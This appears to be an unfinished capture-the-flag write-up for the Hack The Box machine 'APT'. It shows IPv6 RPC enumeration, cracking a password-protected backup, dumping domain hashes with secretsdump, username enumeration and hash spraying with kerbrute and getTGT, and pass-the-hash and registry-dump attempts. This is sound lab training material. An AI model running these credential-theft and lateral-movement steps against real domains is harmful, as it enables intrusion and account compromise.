# HTB - APT

## Overview

![](<machine>.infocard.png)

Short description to include any strange things to be dealt with - Windows Insane

## Useful Skills and Tools

#### Useful thing 1

- description with generic example

#### Useful thing 2

- description with generic example

## Enumeration

### Nmap scan

I started my enumeration with an nmap scan of `10.10.10.213`. The options I regularly use are: `-p-`, which is a shortcut which tells nmap to scan all ports, `-sC` is the equivalent to `--script=default` and runs a collection of nmap enumeration scripts against the target, `-sV` does a service scan, and `-oA <name>` saves all types of output (.nmap,.gnmap, and .xml) with filenames of `<name>`.

```
┌──(zweilos㉿kali)-[~/htb/apt]
└─$ nmap -sCV -n -p- -Pn -vvvv -oA apt 10.10.10.213
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.

PORT    STATE SERVICE REASON  VERSION
80/tcp  open  http    syn-ack Microsoft IIS httpd 10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Gigantic Hosting | Home
135/tcp open  msrpc   syn-ack Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Nmap done: 1 IP address (1 host up) scanned in 132.93 seconds
```

Only two ports open, 80 - HTTP (IIS) and 135 - RPC

### Port 80 - HTTP

found email sales@gigantichosting.com, phone (818) 995-1560

```
<!-- Mirrored from 10.13.38.16/ by HTTrack Website Copier/3.x [XR&CO'2014], Mon, 23 Dec 2019 08:12:54 GMT -->
```
 
In source code saw IP mentioned `10.13.38.16/` also HTTrack Website Copier/3.x

* https://seclists.org/fulldisclosure/2017/May/89
* https://packetstormsecurity.com/files/131160/HTTrack-Website-Copier-3.48-21-DLL-Hijacking.html
* https://en.kali.tools/?p=443&PageSpeed=noscript

Most of the pages on the site did not contain anything useful or interesting.  The `/support` page had a contact form that I tried some XSS and SQLi

submitting the form redirected me to the IP I had seen that the site had been copied from (10.13.38.16). Burp also failed to connect

```
```

I also could not ping that IP.  This was not the way.

### Port 1135 - RPC

```
┌──(zweilos㉿kali)-[~/htb/apt]
└─$ rpcclient -I 10.10.10.213 -U "" -N apt.htb -p 135           
Cannot connect to server.  Error was NT_STATUS_CONNECTION_DISCONNECTED
```

I wasn't able to connect to the machine with RPC client.  I seemed to have hit a dead end

searched for how to enumerate RPC without authentication
* https://airbus-cyber-security.com/the-oxid-resolver-part-1-remote-enumeration-of-network-interfaces-without-any-authentication/

From a windows machine you could possibly use 
* https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/hh875578(v=ws.11)


```python
#!/usr/bin/python

import sys, getopt

from impacket.dcerpc.v5 import transport
from impacket.dcerpc.v5.rpcrt import RPC_C_AUTHN_LEVEL_NONE
from impacket.dcerpc.v5.dcomrt import IObjectExporter

def main(argv):

    try:
        opts, args = getopt.getopt(argv,"ht:",["target="])
    except getopt.GetoptError:
        print('IOXIDResolver.py -t <target>')
        sys.exit(2)

    target_ip = "10.10.10.213"

    for opt, arg in opts:
        if opt == '-h':
            print('IOXIDResolver.py -t <target>')
            sys.exit()
        elif opt in ("-t", "--target"):
            target_ip = arg

    authLevel = RPC_C_AUTHN_LEVEL_NONE

    stringBinding = r'ncacn_ip_tcp:%s' % target_ip
    rpctransport = transport.DCERPCTransportFactory(stringBinding)

    portmap = rpctransport.get_dce_rpc()
    portmap.set_auth_level(authLevel)
    portmap.connect()

    objExporter = IObjectExporter(portmap)
    bindings = objExporter.ServerAlive2()

    print("[*] Retrieving network interface of " + target_ip)

    #NetworkAddr = bindings[0]['aNetworkAddr']
    for binding in bindings:
        NetworkAddr = binding['aNetworkAddr']
        print("Address: " + NetworkAddr)

if __name__ == "__main__":
   main(sys.argv[1:])

```

I copied the PoC from the site and modified the script to scan the IP of my target.

```
┌──(zweilos㉿kali)-[~/htb/apt]
└─$ python3 IOXIDResolver.py 10.10.10.213
[*] Retrieving network interface of 10.10.10.213
Address: apt
Address: 10.10.10.213
Address: dead:beef::b885:d62a:d679:573f
Address: dead:beef::4d93:3f31:7ea4:6f57
```

After running it, I was presented with the hostname (I assume), the IPv4 address, and two IP46 addresses

```
┌──(zweilos㉿kali)-[~/htb/apt]
└─$ ping -c 2 -6 dead:beef::b885:d62a:d679:573f                                                    1 ⨯
PING dead:beef::b885:d62a:d679:573f(dead:beef::b885:d62a:d679:573f) 56 data bytes
64 bytes from dead:beef::b885:d62a:d679:573f: icmp_seq=1 ttl=63 time=68.4 ms
64 bytes from dead:beef::b885:d62a:d679:573f: icmp_seq=2 ttl=63 time=65.4 ms

--- dead:beef::b885:d62a:d679:573f ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1003ms
rtt min/avg/max/mdev = 65.438/66.913/68.389/1.475 ms
```

I was able to ping using the IP6 address.  The TTL of 64 was a bit odd, not sure if that is normal for IPv6.  It showed 127 like normal when pinging the IPv4 address.

```
┌──(zweilos㉿kali)-[~/htb/apt]
└─$ rpcclient -I dead:beef::b885:d62a:d679:573f -U "" -N apt.htb
rpcclient $>
```

Using this IPv6 address I was able to connect using rpcclient

```
rpcclient $> lsaquery
Could not initialise lsarpc. Error was NT_STATUS_ACCESS_DENIED
rpcclient $> srvinfo
        APT.HTB        Wk Sv PDC Tim NT     
        platform_id     :       500
        os version      :       10.0
        server type     :       0x80102b
```

After getting `NT_STATUS_ACCESS_DENIED` for all of my commands I was starting to think I wasn't going to get anything, but finnaly one command returned something. I got the hostname of `APT.HTB`

I went through a lot of the other commands, but wasn't able to get anything else out of this.

### nmap - IPv6

this scan came up with a lot more open ports

```PORT      STATE SERVICE      REASON  VERSION
53/tcp    open  domain       syn-ack Simple DNS Plus
80/tcp    open  http         syn-ack Microsoft IIS httpd 10.0
| http-server-header: 
|   Microsoft-HTTPAPI/2.0
|_  Microsoft-IIS/10.0
|_http-title: Bad Request
88/tcp    open  kerberos-sec syn-ack Microsoft Windows Kerberos (server time: 2021-03-29 01:18:57Z)
135/tcp   open  msrpc        syn-ack Microsoft Windows RPC
389/tcp   open  ldap         syn-ack Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=apt.htb.local
445/tcp   open  microsoft-ds syn-ack Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)
464/tcp   open  kpasswd5?    syn-ack
593/tcp   open  ncacn_http   syn-ack Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap     syn-ack Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=apt.htb.local
3268/tcp  open  ldap         syn-ack Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=apt.htb.local
3269/tcp  open  ssl/ldap     syn-ack Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=apt.htb.local
5985/tcp  open  http         syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
9389/tcp  open  mc-nmf       syn-ack .NET Message Framing
47001/tcp open  http         syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
49664/tcp open  msrpc        syn-ack Microsoft Windows RPC
49665/tcp open  msrpc        syn-ack Microsoft Windows RPC
49666/tcp open  msrpc        syn-ack Microsoft Windows RPC
49667/tcp open  msrpc        syn-ack Microsoft Windows RPC
49669/tcp open  ncacn_http   syn-ack Microsoft Windows RPC over HTTP 1.0
49670/tcp open  msrpc        syn-ack Microsoft Windows RPC
49673/tcp open  msrpc        syn-ack Microsoft Windows RPC
49679/tcp open  msrpc        syn-ack Microsoft Windows RPC
49687/tcp open  msrpc        syn-ack Microsoft Windows RPC
```

This time I was able to see many more ports open.  This was looking like a real Windows server now. `apt.htb.local` hostname

https://www.ethicalhackx.com/how-to-pwn-on-ipv6/
`[dead:beef::b885:d62a:d679:573f]`

I searched for a way to enumerate Windows using ipv6 and found a newer version of a popular tool, enum4linux, that supported ipv6

* https://hacker-gadgets.com/blog/2020/12/04/enum4linux-ng-a-next-generation-version-of-enum4linux-a-windows-samba-enumeration-tool-with-additional-features-like-json-yaml-export/

Using the information from this tool, I learned how to search using smbclient with ipv6

```
┌──(zweilos㉿kali)-[~/htb/apt/enum4linux-ng]
└─$ smbclient -t 5 -W htb -U % -L //dead:beef::b885:d62a:d679:573f                               127 ⨯

        Sharename       Type      Comment
        ---------       ----      -------
        backup          Disk      
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        SYSVOL          Disk      Logon server share 
dead:beef::b885:d62a:d679:573f is an IPv6 address -- no workgroup available
```

Was able to enumerate shares using smbclient.  the backup share looked interesting

```
┌──(zweilos㉿kali)-[~/htb/apt/enum4linux-ng]
└─$ smbclient -t 5 -W htb -U %  //dead:beef::b885:d62a:d679:573f/backup                            1 ⨯
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Thu Sep 24 03:30:52 2020
  ..                                  D        0  Thu Sep 24 03:30:52 2020
  backup.zip                          A 10650961  Thu Sep 24 03:30:32 2020

                10357247 blocks of size 4096. 6963935 blocks available
smb: \> get backup.zip
getting file \backup.zip of size 10650961 as backup.zip (5794.6 KiloBytes/sec) (average 5794.6 KiloBytes/sec)
```

Inside the `backup` share I found a backup.zip and extracted it to my computer

```
┌──(zweilos㉿kali)-[~/htb/apt]
└─$ unzip backup.zip             
Archive:  backup.zip
   creating: Active Directory/
[backup.zip] Active Directory/ntds.dit password: 
   skipping: Active Directory/ntds.dit  incorrect password
   skipping: Active Directory/ntds.jfm  incorrect password
   creating: registry/
   skipping: registry/SECURITY       incorrect password
   skipping: registry/SYSTEM         incorrect password
```

The zip file was password-protected, but not encrypted.  This was a very juicy find, indeed.  If I could extract these files, I could potentially get the password hashes of all of the domain users on this machine

```
┌──(zweilos㉿kali)-[~/htb/apt]
└─$ zip2john backup.zip > backup.hash
backup.zip/Active Directory/ is not encrypted!
ver 2.0 backup.zip/Active Directory/ is not encrypted, or stored with non-handled compression type
ver 2.0 backup.zip/Active Directory/ntds.dit PKZIP Encr: cmplen=8483543, decmplen=50331648, crc=ACD0B2FB
ver 2.0 backup.zip/Active Directory/ntds.jfm PKZIP Encr: cmplen=342, decmplen=16384, crc=2A393785
ver 2.0 backup.zip/registry/ is not encrypted, or stored with non-handled compression type
ver 2.0 backup.zip/registry/SECURITY PKZIP Encr: cmplen=8522, decmplen=262144, crc=9BEBC2C3
ver 2.0 backup.zip/registry/SYSTEM PKZIP Encr: cmplen=2157644, decmplen=12582912, crc=65D9BFCD
NOTE: It is assumed that all files in each archive have the same password.
If that is not the case, the hash may be uncrackable. To avoid this, use
option -o to pick a file at a time.
```

next I used `zip2john` to extract the password hash

```
┌──(zweilos㉿kali)-[~/htb/apt]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt backup.hash
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
iloveyousomuch   (backup.zip)
1g 0:00:00:00 DONE (2021-03-29 21:06) 100.0g/s 819200p/s 819200c/s 819200C/s 123456..whitetiger
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

Then I loaded the hash into John.  It cracked in less than a second. The password was `iloveyousomuch`

```
┌──(zweilos㉿kali)-[~/htb/apt]
└─$ unzip backup.zip
Archive:  backup.zip
[backup.zip] Active Directory/ntds.dit password: 
  inflating: Active Directory/ntds.dit  
  inflating: Active Directory/ntds.jfm  
  inflating: registry/SECURITY       
  inflating: registry/SYSTEM
```

Using this password I was able to successfully extract all of the files


```
┌──(zweilos㉿kali)-[~/htb/apt]
└─$ secretsdump.py -ntds 'Active Directory/ntds.dit' -system registry/SYSTEM -security registry/SECURITY LOCAL
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Target system bootKey: 0x936ce5da88593206567f650411e1d16b
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC
$MACHINE.ACC:plain_password_hex:34005b00250066006f0027007a004700600026004200680052003300630050005b002900550032004e00560053005c004c00450059004f002f0026005e0029003c00390078006a0036002500230039005c005c003f0075004a0034005900500062006000440052004b00220020004900450053003200660058004b00220066002c005800280051006c002a0066006700300052006600520071003d0021002c004200650041005600460074005e0045005600520052002d004c0029005600610054006a0076002f005100470039003d006f003b004700400067003e005600610062002d00550059006300200059006400
$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:b300272f1cdab4469660d55fe59415cb
[*] DefaultPassword
(Unknown User):Password123!
[*] DPAPI_SYSTEM
dpapi_machinekey:0x3e0d78cb8f3ed66196584c44b5701501789fc102
dpapi_userkey:0xdcde3fc585c430a72221a48691fb202218248d46
[*] NL$KM
 0000   73 4F 34 1D 09 C8 F9 32  23 B9 25 0B DF E2 DC 58   sO4....2#.%....X
 0010   44 41 F2 E0 C0 93 CF AD  2F 2E EB 13 81 77 4B 42   DA....../....wKB
 0020   C2 E0 6D DE 90 79 44 42  F4 C2 AD 4D 7E 3C 6F B2   ..m..yDB...M~<o.
 0030   39 CE 99 95 66 8E AF 7F  1C E0 F6 41 3A 25 DA A8   9...f......A:%..
NL$KM:734f341d09c8f93223b9250bdfe2dc584441f2e0c093cfad2f2eeb1381774b42c2e06dde90794442f4c2ad4d7e3c6fb239ce9995668eaf7f1ce0f6413a25daa8
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: 1733ad403c773dde94dddffa2292ffe9
[*] Reading and decrypting hashes from Active Directory/ntds.dit
Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
APT$:1000:aad3b435b51404eeaad3b435b51404ee:b300272f1cdab4469660d55fe59415cb:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:72791983d95870c0d6dd999e4389b211:::

...snipped 1000s of random users...

[*] ClearText password from Active Directory/ntds.dit
APT$:CLEARTEXT:4[%fo'zG`&BhR3cP[)U2NVS\LEYO/&^)<9xj6%#9\\?uJ4YPb`DRK" IES2fXK"f,X(Ql*fg0RfRq=!,BeAVFt^EVRR-L)VaTjv/QG9=o;G@g>Vab-UYc Yd
[*] Cleaning up...
```

There were hundreds of users on this domain!  Luckily there were a couple of plaintext passwords

```
┌──(zweilos㉿kali)-[~/htb/apt]
└─$ awk -F ":" '{print $1}' ntds.dump > users

┌──(zweilos㉿kali)-[~/htb/apt]
└─$ wc -l users 
7996 users
```

I was wrong...there were almost 8000 users!!

```
┌──(zweilos㉿kali)-[~/htb/apt]
└─$ awk -F ":" '{print $1}' ntds.dump | grep -v "[*]" | sort | uniq  > users
                                                                                         
┌──(zweilos㉿kali)-[~/htb/apt]
└─$ wc -l users                                             
2004 users
```

After looking in it a bit, I noticed there were duplicates.  After sorting and pulling out the unique entries there were only...2000 or so left.  Much more manageable, but a lot to go through still.

```
┌──(zweilos㉿kali)-[~/htb/apt]
└─$ kerbrute_linux_amd64 userenum --dc apt.htb.local -d htb users                                  1 ⨯

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 03/29/21 - Ronnie Flathers @ropnop

2021/03/29 21:53:14 >  Using KDC(s):
2021/03/29 21:53:14 >   apt.htb.local:88

2021/03/29 21:53:24 >  [+] VALID USERNAME:       Administrator@htb
2021/03/29 21:54:26 >  [+] VALID USERNAME:       APT$@htb
2021/03/29 22:00:35 >  [+] VALID USERNAME:       henry.vinson@htb
2021/03/29 22:12:34 >  Done! Tested 2004 usernames (3 valid) in 1159.740 seconds
```

Using kerbrute I was able to find 3 valid users out of 2000+

```
┌──(zweilos㉿kali)-[~/htb/apt]
└─$ awk -F":" '{print $3,$4}' ntds.dump | sed 's/ /:/g' > nt_hashes
```

Now I needed to find a valid hash. I put all of the hashes in a file by themselves

```
┌──(zweilos㉿kali)-[~/htb/apt]
└─$ crackmapexec smb apt.htb.local -u henry.vinson -H nt_hashes -d htb
```

I tried using crackmapexec but it did not come up with any results (not sure if it even did anything...)

```
┌──(zweilos㉿kali)-[~/htb/apt]
└─$ getTGT.py -hashes aad3b435b51404eeaad3b435b51404ee:297f523d69d61de58b690f158f052c1d -dc-ip apt.htb.local htb/henry.vinson
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

Kerberos SessionError: KDC_ERR_PREAUTH_FAILED(Pre-authentication information was invalid)
```

Using GetTGT.py from impacket I was able to check one hash, but there was no way to validate all of the hashes at one time

```
┌──(zweilos㉿kali)-[~/htb/apt]
└─$ for x in $(cat nt_hashes);do getTGT.py -hashes x -dc-ip apt.htb.local htb/henry.vinson 2>/dev/null;done
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

not enough values to unpack (expected 2, got 1)
```

I used some bash magic to run the same command for each line in my `nt_hashes` file.  It started giving a bunch of errors for all of the lines that didn't have both halves of the hash (this script from Impacket expects both halves)

```
┌──(zweilos㉿kali)-[~/htb/apt]
└─$ for x in $(cat test);do getTGT.py -hashes $x -dc-ip apt.htb.local htb/henry.vinson;done      
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
```

I pulled out one of the hashes and tried it with just one that was in the right format, but this time I got an error that said my clock was too far off the DC

* https://book.hacktricks.xyz/windows/active-directory-methodology/kerberoast

> If you find this error from Linux: `Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)` it because of your local time, you need to synchronise the host with the DC: ntpdate `<IP of DC>`

I had to install `ntpdate`

```
┌──(zweilos㉿kali)-[~/htb/apt]
└─$ sudo ntpdate apt.htb.local                                                                     1 ⨯
29 Mar 23:07:02 ntpdate[794852]: no server suitable for synchronization found
```

After playing with my system time, I realized that it never jumped forwards for daylight savings time...

```
┌──(zweilos㉿kali)-[~/htb/apt]
└─$ sudo ntpdate pool.ntp.org                                                                      1 ⨯
29 Mar 23:14:48 ntpdate[842178]: step time server 194.36.144.87 offset -3599.289748 sec
```

I simply synced it with a known good ntp server (Note: I realised that I had to change my system clock for another HTB machine in the past (find name and link) so this was just reverting it...)

```
┌──(zweilos㉿kali)-[~/htb/apt]
└─$ date
Tue 30 Mar 2021 12:17:39 AM EDT
```
I still had the same problem... my VM reported one time, but the terminal reported another... the date command was way off for some reason

https://github.com/byt3bl33d3r/CrackMapExec/issues/339

The next day, it was magicly working. I didn't restart the system or anything (I had actually only paused the vm)

```
┌──(zweilos㉿kali)-[~/htb/apt]
└─$ for x in $(cat nt_hashes);do getTGT.py -hashes $x -dc-ip apt.htb.local htb/henry.vinson 2>/dev/null;done                                                        
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

Kerberos SessionError: KDC_ERR_PREAUTH_FAILED(Pre-authentication information was invalid)
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
```

This time I was able to enumerate the users (or at least was able to connect and get the PREAUTH_FAILED error).  

```
┌──(zweilos㉿kali)-[~/htb/apt]
└─$ for x in $(cat nt_hashes);do getTGT.py -hashes $x -dc-ip apt.htb.local htb/henry.vinson | grep -v Impacket | grep -v "KDC_ERR_PREAUTH_FAILED" | tee -a  valid_hash && echo $x >> valid_hash;done

Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
```

I used a bit of bash hackery to remove the results that showed failed attempts and let it run.  (I assumed it would take a long time so I let it go and got dinner)


** this is the way **
*  https://github.com/byt3bl33d3r/CrackMapExec/issues/339
```
┌──(zweilos㉿kali)-[/etc/ssh]
└─$ sudo ssh zweilos@127.0.0.1 -L 445:apt.htb.local:445
```

I had to enable ssh on my machine, then do port forwarding.  

```
┌──(zweilos㉿kali)-[~/htb/apt]
└─$ crackmapexec smb -d htb henry.vinson localhost   
SMB         ::1             445    APT              [*] Windows Server 2016 Standard 14393 (name:APT) (domain:htb) (signing:True) (SMBv1:True)
                                                                                                       
┌──(zweilos㉿kali)-[~/htb/apt]
└─$ crackmapexec smb -d htb henry.vinson -H aad3b435b51404eeaad3b435b51404ee:e53d87d42adaa3ca32bdb34a876cbffb localhost
```

** this is the way**

but other than getting the windows version information, I could not get this to connect afterwards

```
┌──(zweilos㉿kali)-[~/htb/apt]
└─$ crackmapexec --verbose smb -d htb henry.vinson localhost
DEBUG Passed args:
{'aesKey': None,
 'amsi_bypass': None,
 'clear_obfscripts': False,
 'content': False,
 'continue_on_success': False,
 'cred_id': [],
 'darrell': False,
 'depth': None,
 'disks': False,
 'domain': 'htb',
 'exclude_dirs': '',
 'exec_method': None,
 'execute': None,
 'fail_limit': None,
 'force_ps32': False,
 'gen_relay_list': None,
 'get_file': None,
 'gfail_limit': None,
 'groups': None,
 'hash': [],
 'jitter': None,
 'kdcHost': None,
 'kerberos': False,
 'list_modules': False,
 'local_auth': False,
 'local_groups': None,
 'loggedon_users': False,
 'lsa': False,
 'module': None,
 'module_options': [],
 'no_bruteforce': False,
 'no_output': False,
 'ntds': None,
 'obfs': False,
 'only_files': False,
 'pass_pol': False,
 'password': [],
 'pattern': None,
 'port': 445,
 'protocol': 'smb',
 'ps_execute': None,
 'put_file': None,
 'regex': None,
 'rid_brute': None,
 'sam': False,
 'server': 'https',
 'server_host': '0.0.0.0',
 'server_port': None,
 'sessions': False,
 'share': 'C$',
 'shares': False,
 'show_module_options': False,
 'smb_server_port': 445,
 'spider': None,
 'spider_folder': '.',
 'target': ['henry.vinson', 'localhost'],
 'threads': 100,
 'timeout': None,
 'ufail_limit': None,
 'username': [],
 'users': None,
 'verbose': True,
 'wmi': None,
 'wmi_namespace': 'root\\cimv2'}
DEBUG Using selector: EpollSelector
DEBUG Running
DEBUG Started thread poller
DEBUG Error resolving hostname henry.vinson: [Errno -2] Name or service not known
DEBUG Error retrieving os arch of ::1: Could not connect: [Errno 111] Connection refused
SMB         ::1             445    APT              [*] Windows Server 2016 Standard 14393 (name:APT) (domain:htb) (signing:True) (SMBv1:True)
DEBUG Stopped thread poller
```

If someone could tell me what I was doing wrong I would greatly appreciate it!!

# getTGT way (cont)

* https://www.onsecurity.io/blog/abusing-kerberos-from-linux/

STill got time sync error, but this time only for one hash; all others reported PREAUTH error

```
┌──(zweilos㉿kali)-[~/htb/apt]
└─$cat valid_hash
Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
aad3b435b51404eeaad3b435b51404ee:e53d87d42adaa3ca32bdb34a876cbffb
```

couldn't resolve time sync errors...maybe just skip this?

```
┌──(zweilos㉿kali)-[~/htb/apt]
└─$ export KRB5CCNAME=henry.vinson@htb.ccache
```

* https://bluescreenofjeff.com/2017-05-23-how-to-pass-the-ticket-through-ssh-tunnels/

```
┌──(zweilos㉿kali)-[~/htb/apt]
└─$ net time -S apt.htb.local
Tue Mar 30 21:38:19 2021

┌──(zweilos㉿kali)-[~/htb/apt]
└─$ date
Tue 30 Mar 2021 09:28:35 PM EDT
```

my errors were caused because the time was 10 minutes off...Thank you `net time`!!

```
┌──(zweilos㉿kali)-[~/htb/apt]
└─$ for x in $(head -1 test);do getTGT.py -hashes $x -dc-ip apt.htb.local htb/henry.vinson@apt.htb | grep -v Impacket | tee -a valid_hash3 && echo $x >> valid_hash3 ;done

[*] Saving ticket in henry.vinson@apt.htb.ccache
```

And it worked!!

### push on


```
┌──(zweilos㉿kali)-[~/htb/apt]
└─$ psexec.py -hashes 'aad3b435b51404eeaad3b435b51404ee:e53d87d42adaa3ca32bdb34a876cbffb' htb/henry.vinson@apt.htb.local
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Requesting shares on apt.htb.local.....
[-] share 'backup' is not writable.
[-] share 'NETLOGON' is not writable.
[-] share 'SYSVOL' is not writable.
```

The hash seemed to be valid! I got a listing of shares, though it wouldnt connect since they werent writeable

```
┌──(zweilos㉿kali)-[~/htb/apt]
└─$ wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:e53d87d42adaa3ca32bdb34a876cbffb htb/henry.vinson@apt.htb.local 
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] SMBv3.0 dialect used
[-] rpc_s_access_denied
```

```
┌──(zweilos㉿kali)-[~/htb/apt]
└─$ smbexec.py -hashes aad3b435b51404eeaad3b435b51404ee:e53d87d42adaa3ca32bdb34a876cbffb htb/henry.vinson@apt.htb.local
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[-] DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied
```

I was starting to think that the hash was not valid, though it did enumerate shares...

```
┌──(zweilos㉿kali)-[~/htb/apt]
└─$ dcomexec.py -hashes aad3b435b51404eeaad3b435b51404ee:e53d87d42adaa3ca32bdb34a876cbffb htb/henry.vinson@apt.htb.local
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] SMBv3.0 dialect used
[-] rpc_s_access_denied
```

https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/reg-query

```
┌──(zweilos㉿kali)-[~/htb/apt]
└─$ python3 /usr/local/bin/reg.py -dc-ip apt.htb.local -hashes aad3b435b51404eeaad3b435b51404ee:e53d87d42adaa3ca32bdb34a876cbffb apt.htb.local query -keyName HKCU -s
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[!] Cannot check RemoteRegistry status. Hoping it is started...
[-] SMB SessionError: STATUS_ACCESS_DENIED({Access Denied} A process has requested access to an object but has not been granted those access rights.)
```

nothing seemed to work.  I tried each of these using the -k option after exporting the key to KRB5CCNAME and still couldnt progress

```
┌──(zweilos㉿kali)-[~/htb/apt]
└─$ klist
Ticket cache: FILE:henry.vinson@apt.htb.ccache
Default principal: henry.vinson@HTB.LOCAL

Valid starting       Expires              Service principal
03/30/2021 21:54:04  03/31/2021 07:54:04  krbtgt/HTB@HTB.LOCAL
     renew until 03/31/2021 21:52:51
```

* https://0xeb-bp.com/blog/2019/11/21/practical-guide-pass-the-ticket.html

So the ticket was expired.

```
┌──(zweilos㉿kali)-[~/htb/apt]
└─$ for x in $(cat test);do getTGT.py -hashes $x -dc-ip apt.htb.local htb.local/henry.vinson@apt.htb | grep -v Impacket | tee -a  valid_hash;done

[*] Saving ticket in henry.vinson@apt.htb.ccache

┌──(zweilos㉿kali)-[~/htb/apt]
└─$ klist
Ticket cache: FILE:henry.vinson@apt.htb.ccache
Default principal: henry.vinson@HTB.LOCAL

Valid starting       Expires              Service principal
03/31/2021 20:18:19  04/01/2021 06:18:19  krbtgt/HTB@HTB.LOCAL
     renew until 04/01/2021 20:15:12
```

I ran my one-liner from earlier (on just the valid hash!) and the time was refreshed

I tried dumping the registry, and this time it took much, much, longer to output (like everything else on this machine so far!).  I was sure that it was working this time!!  I used the `-s` reg option to make it recursively get all keys.  I chose HKEY-USER first since it was a likely place to find potential credentials and other useful system information.  

* https://www.lifewire.com/hkey-users-2625903

> Each registry key located under the HKEY_USERS hive corresponds to a user on the system and is named with that user's security identifier, or SID. The registry keys and registry values located under each SID control settings specific to that user, like mapped drives, installed printers, environment variables, desktop background, and much more, and is loaded when the user first logs on.

```
┌──(zweilos㉿kali)-[~/htb/apt]
└─$ python3 /home/zweilos/.local/bin/reg.py -k apt.htb.local query -keyName HKLM -s | tee regdump_HKLM

Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[!] Cannot check RemoteRegistry status. Hoping it is started...
[-] DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied
```

Next I tried to download HKLM while I perused through HKU, but I was denied access.

```
\Software\Microsoft\Windows\CurrentVersion\Explorer\SearchPlatform\Preferences\
        BreadCrumbBarSearchDefault      REG_SZ   MSNSearch
        DisableAutoNavigateURL  REG_DWORD        0x0
        DisableAutoResolveEmailAddrs    REG_DWORD        0x0
        DisableResultsInNewWindow       REG_DWORD        0x0
        DisableTabbedBrowsing   REG_DWORD        0x0
        EditSavedSearch REG_DWORD        0x0
        IEAddressBarSearchDefault       REG_SZ   MSNSearch
```

Apparently this user never uses this machine, since their default search was MSN...There surprisingly was actually not that much information in this registry dump

```
\Software\Microsoft\Windows\CurrentVersion\Group Policy\GroupMembership\
        Group0  REG_SZ   S-1-5-21-2993095098-2100462451-206186470-513
        Group1  REG_SZ   S-1-1-0
        Group2  REG_SZ   S-1-5-32-545
        Group3  REG_SZ   S-1-5-32-554
        Group4  REG_SZ   S-1-5-4
        Group5  REG_SZ   S-1-2-1
        Group6  REG_SZ   S-1-5-11
        Group7  REG_SZ   S-1-5-15
        Group8  REG_SZ   S-1-2-0
        Group9  REG_SZ   S-1-18-1
        Group10 REG_SZ   S-1-16-8192
        Count   REG_DWORD        0xb
```

The group policy key gave a listing of the groups that this user was a part of.  I could use this to look up the well known groups by their SID.

```
\Volatile Environment\
        LOGONSERVER     REG_SZ   \\APT
        USERDNSDOMAIN   REG_SZ   HTB.LOCAL
        USERDOMAIN      REG_SZ   HTB
        USERNAME        REG_SZ   henry.vinson
        USERPROFILE     REG_SZ   C:\Users\henry.vinson
        HOMEPATH        REG_SZ   \Users\henry.vinson
        HOMEDRIVE       REG_SZ   C:
        APPDATA REG_SZ   C:\Users\henry.vinson\AppData\Roaming
        LOCALAPPDATA    REG_SZ   C:\Users\henry.vinson\AppData\Local
        USERDOMAIN_ROAMINGPROFILE       REG_SZ   HTB
\Volatile Environment\1\
        SESSIONNAME     REG_SZ   Console
        CLIENTNAME      REG_SZ
```
